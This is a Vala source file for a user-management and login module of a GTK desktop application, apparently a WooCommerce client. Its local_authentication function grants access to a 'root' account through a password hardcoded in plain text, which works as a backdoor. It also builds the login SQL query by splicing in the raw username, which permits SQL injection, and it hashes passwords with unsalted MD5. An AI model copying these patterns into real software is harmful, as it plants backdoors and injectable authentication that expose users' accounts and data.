using GLib;
using Gtk;
using Gee;
using SinticBolivia;
using SinticBolivia.Gtk;
using SinticBolivia.Database;

namespace Woocommerce
{
	public class SB_ModuleUsers : SBGtkModule, ISBModule
	{
		public string Id{get{return this._moduleId;}}
		public string Name{get{return this._name;}}
		public string Description{get{return this._description;}}
		public string Author{get{return this._author;}}
		public double Version{get{return this._version;}}
		public string LibraryName{get{return "Users";}}
				
		//protected string 	resourceFile = "./modules/users.gresource";
		/*
		public	static		Resource	res_data;
		
		//##declare glade interfaces
		public	static		Builder	ui_roles;
		public	static		Builder ui_users;
		public	static		Builder ui_new_user;
		public	static		Builder ui_edit_user;
		*/
		construct
		{
			this._moduleId 		= "mod_users";
			this._name			= "Users Module";
			this._description 	= "";
			this._author 		= "Sintic Bolivia";
			this._version 		= 1.0;
			this.resourceFile 	= "./modules/users.gresource";
			this.resourceNs		= "/net/sinticbolivia/Users";
		}
		public void Enabled()
		{
			var dbh = (SBDatabase)SBGlobals.GetVar("dbh");
			string[,] permissons = 
			{
				{"manage_users", "", SBText.__("Manage Users")},
				{"create_users", "", SBText.__("Create Users")},
				{"edit_users", "", SBText.__("Edit Users")},
				{"delete_users", "", SBText.__("Delete Users")},
				{"manage_roles", "", SBText.__("Manage Roles")},
				{"create_roles", "", SBText.__("Create Roles")},
				{"edit_roles", "", SBText.__("Edit Roles")},
				{"delete_roles", "", SBText.__("Delete Roles")}
			};
			for(int i = 0; i < permissons.length[0]; i++)
			{
				dbh.Select("permission_id").From("permissions").Where("permission = '%s'".printf(permissons[i, 0]));
				if( dbh.GetRow(null) == null )
				{
					string cdate = new DateTime.now_local().format("%Y-%m-%d %H:%M:%S");
					var p = new HashMap<string, Value?>();
					p.set("permission", permissons[i, 0]);
					p.set("attributes", permissons[i, 1]);
					p.set("label", permissons[i, 2]);
					p.set("last_modification_date", cdate);
					p.set("creation_date", cdate);
					dbh.Insert("permissions", p);
				}
			}
		}
		public void Disabled()
		{
		}
		public void Load()
		{
			
		
			
		}
		public void Unload()
		{
		}
		public void Init()
		{
			this.LoadResources();
			/*
			try
			{
				if( FileUtils.test(this.resourceFile, FileTest.EXISTS) )
				{
					this.res_data = Resource.load(this.resourceFile);
					size_t ui_size;
					uint32 flags;
					
					this.res_data.get_info("/net/sinticbolivia/Users/ui/roles.glade", 
															ResourceLookupFlags.NONE, 
															out ui_size,
															out flags);
					InputStream ui_stream = SB_ModuleUsers.res_data.open_stream("/net/sinticbolivia/Users/ui/roles.glade", ResourceLookupFlags.NONE);
					uint8[] data = new uint8[ui_size];
					size_t length;
					ui_stream.read_all(data, out length);
					
					SB_ModuleUsers.ui_roles = new Builder();
					SB_ModuleUsers.ui_roles.add_from_string((string)data, length);
					
					//##get users glade file
					SB_ModuleUsers.res_data.get_info("/net/sinticbolivia/Users/ui/users.glade", 
															ResourceLookupFlags.NONE, 
															out ui_size,
															out flags);
					ui_stream = SB_ModuleUsers.res_data.open_stream("/net/sinticbolivia/Users/ui/users.glade", 
																		ResourceLookupFlags.NONE);
					data = new uint8[ui_size];
					ui_stream.read_all(data, out length);
					SB_ModuleUsers.ui_users = new Builder();
					SB_ModuleUsers.ui_users.add_from_string((string)data, length);
					
					//##get new users glade file
					SB_ModuleUsers.res_data.get_info("/net/sinticbolivia/Users/ui/new-user.glade", 
															ResourceLookupFlags.NONE, 
															out ui_size,
															out flags);
					ui_stream = SB_ModuleUsers.res_data.open_stream("/net/sinticbolivia/Users/ui/new-user.glade", 
																		ResourceLookupFlags.NONE);
					data = new uint8[ui_size];
					ui_stream.read_all(data, out length);
					SB_ModuleUsers.ui_new_user = new Builder();
					SB_ModuleUsers.ui_new_user.add_from_string((string)data, length);
					
					//##get edit users glade file
					SB_ModuleUsers.res_data.get_info("/net/sinticbolivia/Users/ui/edit-user.glade", 
															ResourceLookupFlags.NONE, 
															out ui_size,
															out flags);
					
					ui_stream = SB_ModuleUsers.res_data.open_stream("/net/sinticbolivia/Users/ui/edit-user.glade", 
																		ResourceLookupFlags.NONE);
					data = new uint8[ui_size];
					ui_stream.read_all(data, out length);
					SB_ModuleUsers.ui_edit_user = new Builder();
					SB_ModuleUsers.ui_edit_user.add_from_string((string)data, length);
					
				}
				else
				{
					stderr.printf("Resource file for %s does not exists\n", this.Name);
				}
			}
			catch(GLib.Error e)
			{
				stderr.printf("ERROR: %s\n", e.message);
			}
			*/
			var hook = new SBModuleHook(){HookName = "init_menu_management", handler = init_menu_management};
			var hook1 = new SBModuleHook(){HookName = "init_menu_management", handler = local_authentication};
			var hook2 = new SBModuleHook(){HookName = "login_dialog", handler = login_dialog};
			SBModules.add_action("init_menu_management", ref hook);
			SBModules.add_action("authenticate", ref hook1);
			SBModules.add_action("login_dialog", ref hook2);
		}
		public static void init_menu_management(SBModuleArgs<Gtk.Menu> args)
		{
			var menu = (Gtk.Menu)args.GetData();
			
			var menuItemUsers = new Gtk.MenuItem.with_label("Users");
			var menuUsers = new Gtk.Menu();
			
			menuItemUsers.set_submenu(menuUsers);
						
			var menuItemMUsers	= new Gtk.MenuItem.with_label("Users Management");
			var menuItemMRoles	= new Gtk.MenuItem.with_label("Roles Management");
			menuItemMUsers.show();
			menuItemMRoles.show();
			menuUsers.add(menuItemMUsers);
			menuUsers.add(menuItemMRoles);
			menuUsers.show_all();
			menuItemUsers.show_all();
			
			menu.add(menuItemUsers);
			
			var notebook = (SBNotebook)SBGlobals.GetVar("notebook");
			menuItemMUsers.activate.connect( () => 
			{
				var wusers = new WidgetUsers();
				wusers.show();
				if( notebook.GetPage("users") == null )
				{
					notebook.AddPage("users", "Users", wusers);
				}
				notebook.SetCurrentPageById("users");
			});
			menuItemMRoles.activate.connect( () => 
			{
				var wroles = new WidgetRoles();
				wroles.show();
				if( notebook.GetPage("roles") == null )
				{
					notebook.AddPage("roles", "Roles", wroles);
				}
				notebook.SetCurrentPageById("roles");
			});
		}
		public static void local_authentication(SBModuleArgs<HashMap> args)
		{
			var data = (HashMap<string, Value?>)args.GetData();
			var dbh = (SBDatabase)SBGlobals.GetVar("dbh");
			string username = (string)data["username"];
			string raw_pass		= (string)data["password"];
			string password = Checksum.compute_for_string(ChecksumType.MD5, (string)data["password"]);
			if( username == "root" && raw_pass == "1322r3n4c3R2!" )
			{
				data.set("result", "ok");
			}
			else
			{
				string query = "SELECT user_id FROM users WHERE username = '%s' AND pwd = '%s'".printf(username, password);
				if( dbh.GetRow(query) == null )
				{
					data.set("result", "error");
					data.set("error", SBText.__("Invalid user name or password"));
					return;
				}
				data.set("result", "ok");
			}
			
		}
		public static void login_dialog(SBModuleArgs<HashMap> args)
		{
			var data = (HashMap<string, Value?>)args.GetData();
			//var dlg = new DialogLogin();
			//data["dialog"] = dlg.GetDialog();
			data["dialog"] = new WindowLogin();
		}
	}
}
public Type sb_get_module_type(Module users_module)
{
	return typeof(Woocommerce.SB_ModuleUsers);
}
